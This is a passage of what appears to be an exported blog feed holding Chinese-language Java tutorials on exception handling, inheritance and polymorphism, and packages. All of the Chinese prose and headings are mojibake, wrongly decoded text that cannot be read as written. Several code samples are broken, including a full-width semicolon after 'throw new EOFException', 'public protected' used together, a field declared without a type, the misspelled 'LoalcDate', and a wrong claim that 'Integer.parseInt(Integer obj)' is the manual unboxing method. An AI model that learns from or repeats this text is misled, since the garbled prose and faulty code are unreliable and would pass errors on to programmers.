<p>ä¸€ä¸ªæ–¹æ³•ä¸ä»…éœ€è¦å‘Šè¯‰ç¼–è¯‘å™¨å°†è¦è¿”å›ä»€ä¹ˆå€¼ï¼Œè¿˜è¦å‘Šè¯‰ç¼–è¯‘å™¨æœ‰å¯èƒ½å‘ç”Ÿä»€ä¹ˆé”™è¯¯ã€‚æ‰€ä»¥æ–¹æ³•åº”åœ¨å…¶é¦–éƒ¨å£°æ˜æ‰€æœ‰å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸ï¼Œè¿™æ ·å¯ä»¥ä»é¦–éƒ¨åæ˜ å‡ºè¿™ä¸ªæ–¹æ³•å¯èƒ½æŠ›å‡ºå“ªç±»å—æŸ¥å¼‚å¸¸ã€‚è¿™å°±è¦ç”¨åˆ°<code>throws</code>å…³é”®å­—ã€‚ä¾‹å¦‚FileInputStreamç±»çš„æ„é€ å™¨æ–¹æ³•å¯èƒ½ç”±äºæ–‡ä»¶ä¸å­˜åœ¨è€ŒæŠ›å‡ºä¸€ä¸ªFileNotFoundExceptionï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileInputStream</span><span class="params">(String name)</span> <span class="keyword">throws</span> FileNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¦æ‰‹åŠ¨æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œç”¨å…³é”®å­—<code>throw</code>ã€‚é¦–å…ˆæ„é€ ä¸€ä¸ªå¼‚å¸¸å¯¹è±¡ï¼Œç„¶åç”¨throwæŠŠè¿™ä¸ªå¯¹è±¡æŠ›å‡ºå°±å¯ä»¥äº†ã€‚å¦‚æŠ›å‡ºä¸€ä¸ªEOFExceptionï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> EOFExceptionï¼›</span><br></pre></td></tr></table></figure>

<p>try/catchæ•è·å¼‚å¸¸ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ExceptionType e)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨å¤šä¸ªå•ç‹¬çš„catchå­—å¥æ•è·å¤šä¸ªå¼‚å¸¸ã€‚<br>å¼‚å¸¸å¯¹è±¡å¯èƒ½åŒ…å«ä¸å¼‚å¸¸æœ¬èº«ç›¸å…³çš„ä¿¡æ¯ï¼Œè¦æƒ³è·å¾—å¯¹è±¡çš„æ›´å¤šä¿¡æ¯å¯ä»¥ç”¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">e.getMessage()</span><br></pre></td></tr></table></figure>

<p>å¯¹å®ç°äº† <code>AutoCloseable</code> æ¥å£çš„èµ„æºè¿›è¡Œå¤„ç†æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¸¦èµ„æºçš„ try è¯­å¥ï¼Œè¿™æ ·æ— è®ºæ˜¯å¦æˆåŠŸä½¿ç”¨èµ„æºï¼Œåœ¨ try å—é€€å‡ºæ—¶éƒ½ä¼šè‡ªåŠ¨å…³é—­èµ„æºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> (Resource res = ...)</span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰“å¼€hello.txt</span></span><br><span class="line"><span class="keyword">try</span> (FileWriter writer = <span class="keyword">new</span> FileWriter(<span class="string">&#x27;hello.txt&#x27;</span>, <span class="keyword">true</span>))</span><br><span class="line">&#123;</span><br><span class="line">    deal with the resource</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘å™¨ä¸¥æ ¼æ‰§è¡Œthrowsè¯´æ˜ç¬¦ï¼Œ<strong>å¦‚æœæ–¹æ³•Aè°ƒç”¨äº†æ–¹æ³•Bï¼Œè€Œæ–¹æ³•Bè¢«å£°æ˜ä¸ºå¯èƒ½æŠ›å‡ºå¼‚å¸¸eï¼Œåˆ™Aè¦ä¹ˆç»§æ‰¿eï¼ˆå³å£°æ˜ä¸ºå¯èƒ½æŠ›å‡ºeï¼‰ï¼Œè¦ä¹ˆæ•è·e</strong></p>
<p><code>finally</code> ä¸­çš„ä»£ç ä¸ç®¡æ˜¯å¦æœ‰å¼‚å¸¸è¢«æ•è·ï¼Œéƒ½ä¼šæ‰§è¡Œã€‚å¹¶ä¸”å¦‚æœå¤„ç†ç»“æœä¸ try/catch ä¸­çš„å¤„ç†å‘ç”Ÿå†²çªï¼Œfinally çš„å¤„ç†ç»“æœä¼šè¦†ç›–ä¹‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ExceptionType e)</span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨æ–¹æ³•å£°æ˜ä¸­ï¼Œä¹Ÿå¯ä»¥æŠ›å‡ºThrowableç±»å¼‚å¸¸ï¼Œç”±è¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨è€…å¤„ç†ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Throwable</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Throwable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Throwable t) &#123;</span><br><span class="line">        t.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaåŸºç¡€â€”ç»§æ‰¿ä¸å¤šæ€</title>
    <url>/2018/06/15/Java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E2%80%94%E2%80%94%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%A4%9A%E6%80%81/</url>
    <content><![CDATA[<p>ä¿®é¥°ç¬¦<code>extends</code>è¡¨ç¤ºç»§æ‰¿ï¼Œå­ç±»ä¼šç»§æ‰¿è¶…ç±»çš„åŸŸå’Œæ–¹æ³•ã€‚ä¾‹å¦‚å­ç±»Managerç»§æ‰¿è¶…ç±»Employeeï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Manager</span> <span class="keyword">extends</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// æ·»åŠ æ–°çš„åŸŸæˆ–æ–¹æ³•</span></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<h2 id="è¦†ç›–æ–¹æ³•"><a href="#è¦†ç›–æ–¹æ³•" class="headerlink" title="è¦†ç›–æ–¹æ³•"></a>è¦†ç›–æ–¹æ³•</h2><p>æƒ³è¦è®¿é—®è¶…ç±»çš„ç§åŸŸï¼Œéœ€è¦ä½¿ç”¨ä¿®é¥°ç¬¦<code>super</code>ï¼Œç”¨ <code>super</code> ä»£è¡¨è¶…ç±»ã€‚å¦‚ï¼š<code>é‡å†™</code>Managerçš„getsalaryæ–¹æ³•ä¸ºåŸºæœ¬å·¥èµ„+å¥–é‡‘ã€‚è€Œsalsryæ˜¯privateçš„ï¼Œåªæœ‰Employeeç±»çš„æ–¹æ³•æ‰èƒ½è®¿é—®ã€‚è¦è·å¾—åŸºæœ¬å·¥èµ„å¿…é¡»é€šè¿‡è°ƒç”¨è¶…ç±»getsalaryæ–¹æ³•ã€‚ä¸ºäº†åŒºåˆ«è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œè¶…ç±»çš„æ–¹æ³•è¡¨ç¤ºä¸º<code>super.funcname([args])</code>çš„å½¢å¼ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getSalary</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.salary = bonus + <span class="keyword">super</span>.getsalary();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.salary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>è¦†ç›–æ–¹æ³•æ—¶ï¼Œä¸€å®šè¦ä¿è¯è¿”å›ç±»å‹çš„å…¼å®¹æ€§ã€‚å…è®¸å­ç±»å°†è¦†ç›–æ–¹æ³•çš„è¿”å›ç±»å‹å®šä¹‰ä¸ºåŸè¿”å›ç±»å‹çš„å­ç±»å‹</strong>ã€‚<br><strong>è¦†ç›–æ–¹æ³•æ—¶ï¼Œå­ç±»æ–¹æ³•å¯è§æ€§ä¸èƒ½ä½äºè¶…ç±»ã€‚å¦‚æœè¶…ç±»æ–¹æ³•æ˜¯publicï¼Œé‚£ä¹ˆè¦†ç›–æ–¹æ³•ä¹Ÿæ˜¯public</strong></p>
<h2 id="å­ç±»æ„é€ å™¨"><a href="#å­ç±»æ„é€ å™¨" class="headerlink" title="å­ç±»æ„é€ å™¨"></a>å­ç±»æ„é€ å™¨</h2><p>ç”±äºå­ç±»ä¸èƒ½è®¿é—®è¶…ç±»çš„ç§æœ‰åŸŸï¼Œæ‰€ä»¥å¿…é¡»åœ¨å­ç±»æ„é€ å™¨ä¸­åˆ©ç”¨è¶…ç±»çš„æ„é€ å™¨å¯¹è¶…ç±»ç§æœ‰åŸŸè¿›è¡Œåˆå§‹åŒ–ã€‚é€šè¿‡å…³é”®å­—<code>super</code>å®ç°å¯¹è¶…ç±»æ„é€ å™¨çš„è°ƒç”¨ã€‚</p>
<p><strong><code>super</code>è°ƒç”¨æ„é€ å™¨è¯­å¥å¿…é¡»æ˜¯å­ç±»æ„é€ å™¨çš„ç¬¬ä¸€æ¡è¯­å¥ï¼š</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Manager</span> <span class="keyword">extends</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> bonus;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Manager</span><span class="params">(String aName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(aName);</span><br><span class="line">        <span class="keyword">this</span>.bonus = <span class="number">500</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ–¹æ³•è°ƒç”¨ä¸å¤šæ€"><a href="#æ–¹æ³•è°ƒç”¨ä¸å¤šæ€" class="headerlink" title="æ–¹æ³•è°ƒç”¨ä¸å¤šæ€"></a>æ–¹æ³•è°ƒç”¨ä¸å¤šæ€</h2><p><strong>ä¸€ä¸ªè¢«å®šä¹‰ä¸ºæŒ‡å‘è¶…ç±»çš„å˜é‡å¯ä»¥æŒ‡å‘å­ç±»ï¼Œåä¹‹è¡Œä¸é€š</strong>ã€‚ä¸€ä¸ªå˜é‡å¯¹è±¡å¯ä»¥æŒ‡å‘å¤šç§å®é™…ç±»å‹çš„ç°è±¡è¢«ç§°ä¸º<code>å¤šæ€</code>ï¼Œåœ¨è¿è¡Œæ—¶èƒ½è‡ªåŠ¨é€‰æ‹©è°ƒç”¨å“ªä¸ªæ–¹æ³•çš„ç°è±¡ç§°ä¸º<code>åŠ¨æ€ç»‘å®š</code>ã€‚å¯¹äºprivateã€staticã€finalæ–¹æ³•ï¼Œç¼–è¯‘å™¨å¯ä»¥å‡†ç¡®åœ°çŸ¥é“åº”è¯¥è°ƒç”¨å“ªä¸ªæ–¹æ³•ï¼Œç§°ä¸º<code>é™æ€ç»‘å®š</code></p>
<h2 id="ç†è§£æ–¹æ³•è°ƒç”¨"><a href="#ç†è§£æ–¹æ³•è°ƒç”¨" class="headerlink" title="ç†è§£æ–¹æ³•è°ƒç”¨"></a>ç†è§£æ–¹æ³•è°ƒç”¨</h2><p>å‡è®¾è¦è°ƒç”¨x.f(args)ã€‚å…¶ä¸­xä¸ºéšå¼å‚æ•°ï¼Œå£°æ˜ä¸ºç±»Cçš„ä¸€ä¸ªå¯¹è±¡ï¼Œä¸‹é¢æ˜¯è°ƒç”¨è¿‡ç¨‹æè¿°ï¼š</p>
<ol>
<li>ç¼–è¯‘å™¨æŸ¥çœ‹å¯¹è±¡çš„å£°æ˜ç±»å‹å’Œæ–¹æ³•åã€‚å¯èƒ½å­˜åœ¨å¤šä¸ªåå­—ä¸ºfï¼Œä½†å‚æ•°ç±»å‹ä¸ä¸€æ ·çš„æ–¹æ³•ã€‚ç¼–è¯‘å™¨ä¼šä¸€ä¸€åˆ—ä¸¾æ‰€æœ‰Cç±»ä¸­åä¸ºfçš„æ–¹æ³•å’Œå…¶è¶…ç±»ä¸­è®¿é—®å±æ€§ä¸ºpublicä¸”åä¸ºfçš„æ–¹æ³•ã€‚<em>è‡³æ­¤ç¼–è¯‘å™¨å·²è·å¾—æ‰€æœ‰å¯èƒ½è¢«è°ƒç”¨çš„å€™é€‰æ–¹æ³•</em></li>
<li>ç¼–è¯‘å™¨æŸ¥çœ‹è°ƒç”¨æ–¹æ³•æ˜¯æä¾›çš„å‚æ•°ç±»å‹ã€‚å¦‚æœæ‰€æœ‰åä¸ºfçš„æ–¹æ³•ä¸­å­˜åœ¨ä¸€ä¸ªä¸æä¾›çš„å‚æ•°ç±»å‹å®Œå…¨åŒ¹é…ï¼Œå°±é€‰æ‹©è¿™ä¸ªæ–¹æ³•ã€‚è¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä¸º<code>é‡è½½è§£æ</code>ã€‚ç”±äºå­˜åœ¨ç±»å‹è½¬æ¢ï¼Œæ‰€ä»¥è¯¥è¿‡ç¨‹ä¹Ÿéµå¾ªâ€œç›¸ä¼¼åŸåˆ™â€ï¼Œå½¢å‚ç±»å‹ä¸å®å‚åŒ¹é…åº¦æœ€é«˜çš„ä¼˜å…ˆã€‚<em>è‡³æ­¤ç¼–è¯‘å™¨å·²è·å¾—éœ€è¦è°ƒç”¨çš„æ–¹æ³•åå­—å’Œå‚æ•°ç±»å‹ï¼Œå³æ–¹æ³•ç­¾å</em></li>
<li>åœ¨jvmåˆ›å»ºçš„<code>æ–¹æ³•è¡¨</code>ä¸­æœç´¢ç›¸åº”çš„æ–¹æ³•ã€‚æ¯æ¬¡è°ƒç”¨éƒ½è¦è¿›è¡Œæœç´¢ï¼Œå¼€é”€å¤ªå¤§ã€‚jvmåˆ›å»ºäº†ä¸€å¼ æ–¹æ³•è¡¨ï¼Œé‡Œé¢å­˜æ”¾ç€æ–¹æ³•ç­¾åä¸å®é™…è°ƒç”¨æ–¹æ³•çš„æ˜ å°„å…³ç³»ã€‚</li>
</ol>
<h2 id="é˜»æ­¢ç»§æ‰¿ï¼šfinalç±»å’Œæ–¹æ³•"><a href="#é˜»æ­¢ç»§æ‰¿ï¼šfinalç±»å’Œæ–¹æ³•" class="headerlink" title="é˜»æ­¢ç»§æ‰¿ï¼šfinalç±»å’Œæ–¹æ³•"></a>é˜»æ­¢ç»§æ‰¿ï¼šfinalç±»å’Œæ–¹æ³•</h2><p>ä¸å…è®¸æ‰©å±•çš„ç±»è¢«ç§°ä¸º<code>finalç±»</code>ã€‚å¦‚æœå®šä¹‰ç±»çš„æ—¶å€™ç”¨äº†<code>final</code>ä¿®é¥°ç¬¦å°±è¡¨æ˜è¿™ä¸ªç±»æ˜¯finalç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Programmer</span> <span class="keyword">extends</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç±»ä¸­çš„æ–¹æ³•ä¹Ÿå¯ä»¥è¢«å£°æ˜ä¸º<code>final</code>ã€‚å¦‚æœè¿™æ ·åšå­ç±»å°±ä¸èƒ½è¦†ç›–è¿™ä¸ªæ–¹æ³•ï¼ˆfinalç±»çš„æ‰€æœ‰æ–¹æ³•é»˜è®¤ä¸ºfinalæ–¹æ³•ï¼‰ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°†æ–¹æ³•æˆ–ç±»å®šä¹‰ä¸º<code>final</code>æœ€å¤§çš„å¥½å¤„æ˜¯é˜²æ­¢å…¶åœ¨å­ç±»ä¸­è¢«æ”¹å˜å«ä¹‰ã€‚</p>
<h2 id="å—ä¿æŠ¤è®¿é—®"><a href="#å—ä¿æŠ¤è®¿é—®" class="headerlink" title="å—ä¿æŠ¤è®¿é—®"></a>å—ä¿æŠ¤è®¿é—®</h2><p>æœ€å¥½å°†ç±»ä¸­çš„åŸŸæ ‡è®°ä¸º<code>private</code>ï¼Œä»»ä½•å£°æ˜ä¸º<code>private</code>çš„å†…å®¹å¯¹å…¶ä»–ç±»éƒ½æ˜¯ä¸å¯è§çš„ï¼Œå³ä½¿æ˜¯å­ç±»ä¹Ÿä¸€æ ·ã€‚å¦‚æœå¸Œæœ›å­ç±»èƒ½å¤Ÿè®¿é—®è¶…ç±»çš„ç§æœ‰åŸŸæˆ–æ–¹æ³•ï¼Œå¯ä»¥ç”¨ä¿®é¥°ç¬¦ï¼š<code>protected</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> salary;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">protected</span> <span class="keyword">double</span> <span class="title">getsalary</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Javaçš„4ç§å¯è§æ€§ä¿®é¥°ç¬¦"><a href="#Javaçš„4ç§å¯è§æ€§ä¿®é¥°ç¬¦" class="headerlink" title="Javaçš„4ç§å¯è§æ€§ä¿®é¥°ç¬¦"></a>Javaçš„4ç§å¯è§æ€§ä¿®é¥°ç¬¦</h2><p>ä¸‹é¢æ˜¯Javaç”¨äºæ§åˆ¶å¯è§æ€§çš„4ç§ä¿®é¥°ç¬¦ï¼š  </p>
<ol>
<li>ä»…å¯¹æœ¬ç±»å¯è§â€”â€”private</li>
<li>å¯¹æ‰€æœ‰ç±»å¯è§â€”â€”public</li>
<li>å¯¹æœ¬åŒ…å’Œæ‰€æœ‰å­ç±»å¯è§â€”â€”protected</li>
<li>ä»…å¯¹æœ¬åŒ…å¯è§â€”â€”é»˜è®¤ï¼Œä¸éœ€è¦ä¿®é¥°ç¬¦</li>
</ol>
<h2 id="å¯¹è±¡åŒ…è£…å™¨"><a href="#å¯¹è±¡åŒ…è£…å™¨" class="headerlink" title="å¯¹è±¡åŒ…è£…å™¨"></a>å¯¹è±¡åŒ…è£…å™¨</h2><p>Javaä¸æ˜¯å®Œå…¨çš„é¢å‘å¯¹è±¡è¯­è¨€ï¼Œå…¶åŸºæœ¬ç±»å‹ï¼šbooleanã€charã€shortã€intã€longã€floatã€doubleçš„å€¼éƒ½ä¸æ˜¯å¯¹è±¡ã€‚è€Œè¿™äº›åŸºæœ¬ç±»å‹éƒ½æœ‰ä¸ä¹‹å¯¹åº”çš„ç±»ã€‚å¦‚intå¯¹åº”Integerï¼Œcharå¯¹åº”Characterï¼Œvoidå¯¹åº”Voidâ€¦å¯¹è±¡åŒ…è£…ç±»åŒ…è£…çš„å€¼éƒ½æ˜¯ä¸å˜çš„ã€‚</p>
<p>è¦å®šä¹‰ä¸€ä¸ªæ•´å½¢æ•°ç»„åˆ—è¡¨ï¼Œåªè¦ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ï¼Œè°ƒç”¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.add(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘å™¨å°†ä¼šå°†å…¶è§†ä¸ºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.add(Integer.valueOf(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>

<p>è¿™ç§è¡Œä¸ºç§°ä¸º<code>è‡ªåŠ¨è£…ç®±</code>ï¼Œä¸ä¹‹å¯¹åº”çš„è¿˜æœ‰<code>è‡ªåŠ¨æ‹†ç®±</code>ã€‚æ‰‹åŠ¨æ‹†ç®±çš„æ–¹æ³•ä¸º<code>Integer.parseInt(Integer obj)</code></p>
]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaåŸºç¡€â€”åŒ…</title>
    <url>/2018/06/15/Java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E2%80%94%E2%80%94%E5%8C%85/</url>
    <content><![CDATA[<p>Java å…è®¸ä½¿ç”¨åŒ…ï¼ˆpackageï¼‰å°†ç±»ç»„ç»‡èµ·æ¥ï¼Œä½¿ç”¨åŒ…çš„ä¸»è¦åŸå› æ˜¯ç¡®ä¿ç±»åçš„å”¯ä¸€æ€§ã€‚å¦‚æœæœ‰ä¸¤ä¸ªåå­—ç›¸åŒçš„ç±»ï¼Œåªè¦æŠŠå®ƒä»¬æ”¾åœ¨ä¸åŒçš„åŒ…ä¸­å°±ä¸ä¼šæœ‰å½±å“ã€‚</p>
<p>ä»ç¼–è¯‘å™¨ï¼ˆcompilerï¼‰çš„è§’åº¦çœ‹ï¼ŒåµŒå¥—çš„åŒ…ä¹‹é—´æ²¡æœ‰ä»»ä½•å…³ç³»ã€‚ä¾‹å¦‚java.utilåŒ…ä¸ java.util åŒ…æ¯«æ— å…³ç³»ï¼Œæ¯ä¸€ä¸ªéƒ½æ‹¥æœ‰ç‹¬ç«‹çš„ç±»é›†åˆã€‚</p>
<p>å½“ç¼–è¯‘ä¸€ä¸ª .java æ–‡ä»¶ï¼ˆå³ä¸€ä¸ªç¼–è¯‘å•å…ƒï¼‰æ—¶ï¼Œåœ¨.javaæ–‡ä»¶ä¸­çš„æ¯ä¸ªç±»éƒ½ä¼šæœ‰ä¸€ä¸ªè¾“å‡ºæ–‡ä»¶ï¼Œè€Œè¯¥è¾“å‡ºæ–‡ä»¶çš„åç§°ä¸ .java æ–‡ä»¶ä¸­æ¯ä¸ªç±»çš„åç§°ç›¸åŒï¼Œåªæ˜¯å¤šäº†ä¸€ä¸ªåç¼€å .classã€‚å› æ­¤åœ¨ç¼–è¯‘å°‘é‡ .java æ–‡ä»¶ä¹‹åï¼Œä¼šå¾—åˆ°å¤§é‡çš„ .class æ–‡ä»¶ã€‚æ¯ä¸€ä¸ª .java æ–‡ä»¶ç¼–è¯‘ä»¥åéƒ½ä¼šæœ‰ä¸€ä¸ª public ç±»ï¼Œä»¥åŠä»»æ„æ•°é‡çš„é public ç±»ã€‚å› æ­¤æ¯ä¸ª .java æ–‡ä»¶éƒ½æ˜¯ä¸€ä¸ªæ„ä»¶ï¼Œå¦‚æœå¸Œæœ›è®¸è®¸å¤šå¤šçš„è¿™æ ·çš„æ„ä»¶ä»å±äºåŒä¸€ä¸ªç¾¤ç»„ï¼Œå°±å¯ä»¥åœ¨æ¯ä¸€ä¸ª .java æ–‡ä»¶ä¸­ä½¿ç”¨å…³é”®å­— packageã€‚è€Œè¿™ä¸ªç¾¤ç»„å°±æ˜¯ä¸€ä¸ªç±»åº“ã€‚</p>
<p>å°±è¡¨ç¤ºä½ åœ¨å£°æ˜è¯¥ç¼–è¯‘å•å…ƒæ˜¯åä¸º fruit çš„ç±»åº“çš„ä¸€éƒ¨åˆ†ï¼Œæˆ–è€…æ¢å¥è¯è¯´ï¼Œä½ æ­£åœ¨å£°æ˜è¯¥ç¼–è¯‘å•å…ƒä¸­çš„ public ç±»åç§°æ˜¯ä½äº fruit åç§°çš„ä¿æŠ¤ä¼ä¸‹ï¼Œç”± fruit åç§°ç½©ç€ã€‚ä»»ä½•æƒ³è¦ä½¿ç”¨è¯¥ public ç±»åç§°çš„äººéƒ½å¿…é¡»æŒ‡å®šå…¨åæˆ–è€…ä¸ fruit ç»“åˆä½¿ç”¨å…³é”®å­— importã€‚</p>
<p>ä¸€ä¸ªç±»ã€æ–¹æ³•æˆ–å˜é‡å¦‚æœæ²¡æœ‰æŒ‡å®š <code>private</code> æˆ– <code>public</code>ï¼Œåˆ™å¯ä»¥è¢«åŒä¸€ä¸ªåŒ…ä¸­çš„æ‰€æœ‰æ–¹æ³•è®¿é—®ï¼ˆå¦‚éå…¬ï¼‰ã€‚</p>
<h2 id="å°†ç±»æ”¾å…¥åŒ…é‡Œ"><a href="#å°†ç±»æ”¾å…¥åŒ…é‡Œ" class="headerlink" title="å°†ç±»æ”¾å…¥åŒ…é‡Œ"></a>å°†ç±»æ”¾å…¥åŒ…é‡Œ</h2><p>è¦æƒ³å°†ç±»æ”¾å…¥åŒ…ä¸­ï¼Œå°±å¿…é¡»å°†åŒ…çš„åå­—æ”¾åœ¨æºæ–‡ä»¶çš„å¼€å¤´ã€‚åŒ…ä¸­å®šä¹‰ç±»çš„ä»£ç ä¹‹å‰ã€‚ä½¿ç”¨å…³é”®å­— <code>package</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶åä¸ºEmployee.javaï¼Œä½äºç›®å½•com/qiuyueqy/learnjavaä¸‹</span></span><br><span class="line"><span class="keyword">package</span> com.qiuyueqy.learnjava;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç è¡¨æ˜ç¼–è¯‘å•å…ƒä½äº com.qiuyueqy.learnjava çš„ä¿æŠ¤ä¼ä¸‹ï¼Œä»»ä½•æƒ³è¦ä½¿ç”¨è¯¥ public ç±»çš„äººå¿…é¡»æŒ‡å®šå…¨åæˆ–ä½¿ç”¨ä¿®é¥°ç¬¦ <code>import</code></p>
<p>å¦‚æœæ²¡æœ‰åœ¨æºæ–‡ä»¶ä¸­æ”¾ç½® package è¯­å¥ï¼Œè¿™ä¸ªæºæ–‡ä»¶ä¸­çš„ç±»å°±è¢«æ”¾ç½®åœ¨ä¸€ä¸ªé»˜è®¤åŒ…ï¼ˆdefault packageï¼‰ä¸­ã€‚é»˜è®¤åŒ…æ˜¯ä¸€ä¸ªæ²¡æœ‰åå­—çš„åŒ…</p>
<h2 id="ç±»çš„å¯¼å…¥"><a href="#ç±»çš„å¯¼å…¥" class="headerlink" title="ç±»çš„å¯¼å…¥"></a>ç±»çš„å¯¼å…¥</h2><p>ä¸€ä¸ªç±»å¯ä»¥ä½¿ç”¨æ‰€å±åŒ…ä¸­æ‰€æœ‰çš„ç±»ï¼Œä¸€èµ·å…¶ä»–åŒ…çš„å…¬æœ‰ç±»ã€‚å¯ä»¥ç”¨ä¸¤ç§æ–¹å¼è®¿é—®å…¶ä»–åŒ…çš„å…¬æœ‰ç±»ï¼š</p>
<ul>
<li>åœ¨ç±»åå‰åŠ ä¸Šå®Œæ•´çš„åŒ…å</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.time.LocalDate date = <span class="keyword">new</span> java.time.LoalcDate.now();</span><br></pre></td></tr></table></figure>

<ul>
